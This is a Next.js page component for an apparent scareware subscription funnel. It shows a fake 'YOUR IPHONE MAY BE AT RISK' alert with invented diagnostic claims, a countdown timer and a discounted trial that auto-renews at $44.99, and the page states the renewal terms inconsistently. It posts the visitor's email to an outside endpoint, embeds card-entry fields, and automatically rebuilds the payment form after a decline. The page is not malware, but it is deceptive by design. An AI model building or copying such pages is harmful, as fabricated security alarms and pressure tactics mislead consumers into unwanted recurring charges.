'use client'

import { useState, useEffect, useRef } from 'react'
import Link from 'next/link'
import Script from 'next/script'

declare global {
	interface Window {
		truegateSdk: any
	}
}

export default function SpecialPage() {
	const [timerText, setTimerText] = useState('10 : 00')
	const [errorMsg, setErrorMsg] = useState('')
	const [isSuccess, setIsSuccess] = useState(false)

	// Состояния для кнопки оплаты
	const [isPayDisabled, setIsPayDisabled] = useState(true)
	const [payBtnText, setPayBtnText] = useState('PAY')

	// Состояния для оверлея
	const [isOverlayHidden, setIsOverlayHidden] = useState(false)
	const [overlayContent, setOverlayContent] = useState({
		text: 'Your data is protected by AES-256 encryption',
		color: '#666',
	})

	// Ссылки на функции и флаги
	const sdkInitRef = useRef(false)
	const submitCardRef = useRef<any>(null)
	
	// НОВЫЙ РЕФ ДЛЯ ХРАНЕНИЯ SDK (чтобы убивать его при ошибке)
	const sdkInstanceRef = useRef<any>(null)

	useEffect(() => {
		// ЗАЩИТА: Если нет email - выгоняем на страницу ввода
		if (!sessionStorage.getItem('userEmail')) {
			window.location.replace('/home-email')
			return
		}

		const savedEmail = sessionStorage.getItem('userEmail')
		if (savedEmail) {
			preparePayment(savedEmail)
		} else {
			setOverlayContent({
				text: 'Authentication error. Redirecting...',
				color: 'red',
			})
		}
	}, [])

	// ==========================================
	// ЛОГИКА ТАЙМЕРА
	// ==========================================
	useEffect(() => {
		let totalSeconds = 600
		const timer = setInterval(() => {
			if (totalSeconds <= 0) {
				clearInterval(timer)
				return
			}
			totalSeconds--
			const m = Math.floor(totalSeconds / 60)
				.toString()
				.padStart(2, '0')
			const s = (totalSeconds % 60).toString().padStart(2, '0')
			setTimerText(`${m} : ${s}`)
		}, 1000)

		return () => clearInterval(timer)
	}, [])

	// ==========================================
	// ИНИЦИАЛИЗАЦИЯ ПЛАТЕЖА И СЕРВЕРНЫЙ REFRESH
	// ==========================================
	const preparePayment = async (targetEmail: string, forceRetry = false) => {
		if (sdkInitRef.current && !forceRetry) return
		sdkInitRef.current = true

		if (!forceRetry) {
			setOverlayContent({
				text: 'Securing payment connection...',
				color: '#007bff',
			})
		}

		try {
			const response = await fetch(
				'https://wa-adminn.com/api/v1/subscription-payment-widget/',
				{
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({
						subscription_type_code: 'trial_month',
						email: targetEmail,
					}),
				},
			)

			const data = await response.json()

			if (
				!response.ok ||
				!data.payment_widget ||
				!data.payment_widget.transactionId
			) {
				throw new Error('Failed to get transaction ID')
			}

			// Пробрасываем email дальше, чтобы в случае ошибки знать, кого рестартовать
			await initTruegateSDK(data.payment_widget.transactionId, targetEmail)
		} catch (error) {
			sdkInitRef.current = false
			setOverlayContent({
				text: 'Error loading payment form. Refresh page.',
				color: 'red',
			})
		}
	}

	const initTruegateSDK = async (transactionId: string, targetEmail: string) => {
		await new Promise<void>(resolve => {
			if (window.truegateSdk) resolve()
			else {
				window.addEventListener('message', e => {
					if (e.data && e.data.type === 'SDK_READY') resolve()
				})
			}
		})

		// 1. УБИВАЕМ СТАРЫЙ SDK, ЕСЛИ ОН БЫЛ
		if (sdkInstanceRef.current) {
			if (typeof sdkInstanceRef.current.destroy === 'function') {
				try {
					sdkInstanceRef.current.destroy()
				} catch (e) {
					console.warn('Destroy error:', e)
				}
			}
			sdkInstanceRef.current = null
			submitCardRef.current = null
		}

		// 2. СОЗДАЕМ НОВЫЙ SDK
		const sdkInstance = new window.truegateSdk({
			id: 'payment-instance',
			transactionId: transactionId,
			env: 'PROD',
		})

		sdkInstance.on('PAYMENT_STATUS', (payload: any) => {
			if (payload.details.status === 'SUCCESS') {
				setIsSuccess(true)
				setErrorMsg('🎉 Payment successful! Redirecting...')
				setTimeout(() => (window.location.href = '/thankyou'), 1500)
			} else if (payload.details.status === 'FAILED') {
				// 3. ПРИ ОШИБКЕ: Сообщаем пользователю и запускаем рестарт формы
				setErrorMsg('Payment declined. Generating a new secure form...')
				setIsPayDisabled(true)
				setPayBtnText('Reloading...')

				setTimeout(() => {
					setErrorMsg('')
					setOverlayContent({
						text: 'Regenerating secure connection...',
						color: '#007bff',
					})
					setIsOverlayHidden(false) // Возвращаем белый оверлей на поля ввода
					preparePayment(targetEmail, true) // forceRetry = true
				}, 1500)
			}
		})

		sdkInstance.on('PAYMENT_ERROR', () => {
			setErrorMsg('Error processing payment. Please check card details.')
			resetPayButton()
		})

		await sdkInstance.init()
		
		// 4. СОХРАНЯЕМ ИНСТАНС ДЛЯ БУДУЩИХ УДАЛЕНИЙ
		sdkInstanceRef.current = sdkInstance

		try {
			// Дополнительная очистка контейнеров перед вставкой
			const numEl = document.getElementById('card-number')
			const expEl = document.getElementById('card-expiration')
			const cvvEl = document.getElementById('card-cvv')
			if (numEl) numEl.innerHTML = ''
			if (expEl) expEl.innerHTML = ''
			if (cvvEl) cvvEl.innerHTML = ''

			const result = await sdkInstance.initCardPayment({
				cardNumberId: 'card-number',
				expirationId: 'card-expiration',
				securityCodeId: 'card-cvv',
				options: {
					FONT_NAME: 'system-ui, -apple-system, sans-serif',
					FONT_SIZE: '16px',
					COLOR: '#111827',
					PLACEHOLDER_COLOR: '#9ca3af',
					PLACEHOLDER_CARD_NUMBER: '0000 0000 0000 0000',
					PLACEHOLDER_EXPIRATION: 'MM / YY',
					PLACEHOLDER_SECURITY_CODE: 'CVC',
					CUSTOM_CSS: `
						input[type="number"]::-webkit-outer-spin-button,
						input[type="number"]::-webkit-inner-spin-button {
							-webkit-appearance: none !important;
							margin: 0 !important;
						}
						input[type="number"] {
							-moz-appearance: textfield !important;
						}
					`,
				},
			})
			submitCardRef.current = result.submit

			// Форма загружена успешно — прячем оверлей и активируем кнопку
			setIsOverlayHidden(true)
			setIsPayDisabled(false)
			setPayBtnText('PAY')
		} catch (e) {
			console.error('SDK Fields Init Error', e)
		}
	}

	// ==========================================
	// ОБРАБОТКА НАЖАТИЯ "PAY"
	// ==========================================
	const handlePaymentSubmit = async () => {
		if (!submitCardRef.current) return
		setErrorMsg('')
		setIsPayDisabled(true)
		setPayBtnText('Processing...')

		try {
			await submitCardRef.current({ cardHolderName: 'Card Holder' })
		} catch (error) {
			setErrorMsg('Please fill in all card details correctly.')
			resetPayButton()
		}
	}

	const resetPayButton = () => {
		setIsPayDisabled(false)
		setPayBtnText('PAY')
	}

	return (
		<>
			{/* ЧИСТЫЕ СТИЛИ С ЖЕСТКОЙ ЗАЩИТОЙ ОТ ДУБЛЕЙ */}
			<style
				dangerouslySetInnerHTML={{
					__html: `
					.secure-overlay {
						position: absolute;
						top: 0; left: 0; right: 0; bottom: 0;
						background: rgba(255, 255, 255, 0.95);
						z-index: 10;
						display: flex;
						flex-direction: column;
						align-items: center;
						justify-content: center;
						text-align: center;
						padding: 20px;
						border-radius: 8px;
						transition: opacity 0.3s;
					}

					.secure-overlay.hidden {
						opacity: 0;
						pointer-events: none;
					}

					.relative-container {
						position: relative;
						min-height: 250px;
					}

					/* Возвращаем стандартные настройки контейнера */
					div.custom-input {
						height: 48px;
						background: #ffffff;
						border: 1px solid #cbd5e1;
						border-radius: 6px;
						padding: 0 16px;
						width: 100%;
						box-sizing: border-box;
						box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.05);
						display: block; /* УБРАЛИ FLEX, чтобы ничего не съезжало вбок */
						overflow: hidden;
					}

					div.custom-input iframe {
						display: block !important;
						width: 100% !important;
						height: 100% !important;
						border: none !important;
						outline: none !important;
						background: transparent !important;
						margin: 0 !important;
						padding: 0 !important;
					}

					/* 🔴 ЖЕСТКИЙ ФИКС ОТ ЛЮБЫХ ДУБЛИРОВАНИЙ 🔴 */
					/* Если SDK попытается вставить 2, 3 или 10 полей из-за React Strict Mode - 
					   браузер оставит только первое, а остальные сделает невидимыми */
					div.custom-input iframe:nth-of-type(n+2) {
						display: none !important;
					}
				`,
				}}
			/>

			<Script
				src='https://sdk.truegate.tech/sdk.js'
				strategy='afterInteractive'
			/>

			<div className='app-container'>
				<div className='alert-card'>
					<div className='settings-icon-wrapper'>
						<img src='/img/setting.svg' alt='setting' />
					</div>
					<div className='alert-title'>
						URGENT: <span>YOUR IPHONE</span> <br /> MAY BE AT <span>RISK</span>
					</div>
					<div className='alert-desc'>
						Signs of unstable device performance have been detected. These may
						affect cellular connection, contact access, media library, and other
						important iPhone functions if the check is postponed.
					</div>

					<div className='alert-list-item'>
						<img src='/img/set-ic1.svg' alt='setting icon' />
						Check your device, detect issues, and fix important errors.
					</div>
					<div className='alert-list-item'>
						<img src='/img/set-ic2.svg' alt='setting icon' />
						Run a system diagnostic, detect possible failures, and resolve
						critical issues.
					</div>
				</div>

				<a href='#payment-form' className='btn-blue btn-spec'>
					Secure Device Now
				</a>

				<div className='deal-card'>
					<div className='timer-pill' id='timer'>
						{timerText}
					</div>

					<div className='deal-header'>
						<div className='deal-title'> LIMITED-TIME DEAL</div>
						<div className='deal-price-box'>
							<div className='price-new'>$4.99 / 3-day trial</div>
							<div className='price-old'>$44.99 / monthly</div>
						</div>
					</div>

					<div className='deal-check-list'>
						<div className='deal-check-item'>
							<img src='/img/galochka.svg' alt='galochka' />
							24/7 Live Device Protection
						</div>
						<div className='deal-check-item'>
							<img src='/img/galochka.svg' alt='galochka' />
							Immediate System Optimization
						</div>
						<div className='deal-check-item'>
							<img src='/img/galochka.svg' alt='galochka' />
							Advanced Threat Cleanup
						</div>
					</div>
				</div>

				<div className='payment-container' id='payment-form'>
					<h2 className='section-title' style={{ marginBottom: '24px' }}>
						ENTER YOUR PAYMENT DETAILS
					</h2>

					<div className='relative-container'>
						<div
							className={`secure-overlay ${isOverlayHidden ? 'hidden' : ''}`}
							id='card-overlay'
						>
							<p
								style={{
									fontWeight: 600,
									color: '#333',
									marginBottom: '10px',
									fontSize: '16px',
								}}
							>
								Securing payment connection...
							</p>
							<span
								id='overlay-msg'
								style={{ color: overlayContent.color, fontSize: '14px' }}
							>
								{overlayContent.text}
							</span>
						</div>

						<div className='input-group'>
							<span className='input-label'>Payment card number</span>
							<div id='card-number' className='custom-input'></div>
						</div>

						<div className='row-50-50'>
							<div className='input-group'>
								<span className='input-label'>Expiration date</span>
								<div id='card-expiration' className='custom-input'></div>
							</div>
							<div className='input-group'>
								<span className='input-label'>CVV/CVC</span>
								<div id='card-cvv' className='custom-input'></div>
							</div>
						</div>

						{errorMsg && (
							<div
								id='card-errors'
								role='alert'
								style={{
									color: isSuccess ? '#10B981' : 'red',
									marginBottom: '15px',
									fontSize: '14px',
									textAlign: 'center',
									fontWeight: 'bold',
								}}
							>
								{errorMsg}
							</div>
						)}

						<button
							type='button'
							id='submit-button'
							className='btn-green-pay'
							disabled={isPayDisabled}
							onClick={handlePaymentSubmit}
							style={{ opacity: isPayDisabled ? 0.5 : 1 }}
						>
							{payBtnText === 'PAY' && (
								<img src='/img/paygreen.svg' alt='pay' />
							)}
							{payBtnText !== 'PAY' ? payBtnText : ' PAY'}
						</button>
					</div>
				</div>

				<div className='guarantee-section'>
					<div className='guarantee-box'>
						<div className='guarantee-header'>
							<h3 className='guarantee-title'>100% Money-Back Guarantee</h3>
						</div>
						<p className='guarantee-desc'>
							We take pride in the reliability and effectiveness — thousands of
							users worldwide trust us to protect their devices and personal
							data every day. If you&apos;ve experienced technical issues ,
							we&apos;re committed to making it right — including offering a
							full refund.
						</p>
					</div>
					<div className='disclaimer-text'>
						You will be automatically charged $4.99 for a 3-day trial. The
						subscription will then be auto-renewed after 4 days at the full
						price of $44.99. Payments are charged in USD. To learn more, visit
						our Terms of Use or Privacy Policy.
					</div>
				</div>

				<h2 className='section-title' style={{ textAlign: 'left' }}>
					HERE&apos;S WHAT&apos;S INCLUDED
				</h2>

				<ul className='features-grid'>
					<li className='feature-card'>
						<img src='/img/ic-1.svg' alt='icon' />
						<p className='feature-title'>Personal Data Monitor</p>
						<p className='feature-desc'>Checks your inbox for data leaks</p>
					</li>
					<li className='feature-card'>
						<img src='/img/ic-2.svg' alt='icon' />
						<p className='feature-title'>Mail Threat Scanner</p>
						<p className='feature-desc'>Spots scams and phishing emails</p>
					</li>
					<li className='feature-card'>
						<img src='/img/ic-3.svg' alt='icon' />
						<p className='feature-title'>Website Safety Check</p>
						<p className='feature-desc'>Blocks dangerous websites</p>
					</li>
					<li className='feature-card'>
						<img src='/img/ic-4.svg' alt='icon' />
						<p className='feature-title'>Text Message Filter</p>
						<p className='feature-desc'>Filters spam and risky SMS</p>
					</li>
					<li className='feature-card'>
						<img src='/img/ic-5.svg' alt='icon' />
						<p className='feature-title'>Smartphone Guardn</p>
						<p className='feature-desc'>Protects your phone from threats</p>
					</li>
					<li className='feature-card'>
						<img src='/img/ic-6.svg' alt='icon' />
						<p className='feature-title'>Ad & Tracker Blocker</p>
						<p className='feature-desc'>Blocks ads and hidden trackers</p>
					</li>
					<li className='feature-card'>
						<img src='/img/ic-7.svg' alt='icon' />
						<p className='feature-title'>Battery Health Manager</p>
						<p className='feature-desc'>Helps extend battery life</p>
					</li>
					<li className='feature-card'>
						<img src='/img/ic-8.svg' alt='icon' />
						<p className='feature-title'>Encrypted Web Access</p>
						<p className='feature-desc'>Encrypts your browsing connection</p>
					</li>
				</ul>

				<div className='guarantee-box'>
					<h2 className='guarantee-title'>100% REFUND ASSURANCE</h2>

					<img className='guarantee-stamp' src='/img/30svg.svg' alt='shtamp' />
					<div className='guarantee-text-dark'>
						Our service is built around reliability and effective device
						protection. Users around the world rely on it every day to help
						safeguard their devices and personal information. If technical
						problems prevented you from using the app properly, we&apos;ll work
						to resolve the situation, including providing a full refund when
						appropriate.
					</div>
					<div className='guarantee-text-light'>
						You will be charged four dollars and ninety-nine cents after payment
						confirmation. The subscription will renew monthly after the one-week
						introductory offer at the full price of forty-four dollars and
						ninety-nine cents. Payments are processed in USD. To learn more,
						visit our
						<br />
						<Link href='/policy' target='_blank'>
							Privacy Policy
						</Link>{' '}
						or{' '}
						<Link href='/terms' target='_blank'>
							Terms of Use
						</Link>
					</div>
				</div>
			</div>
		</>
	)
}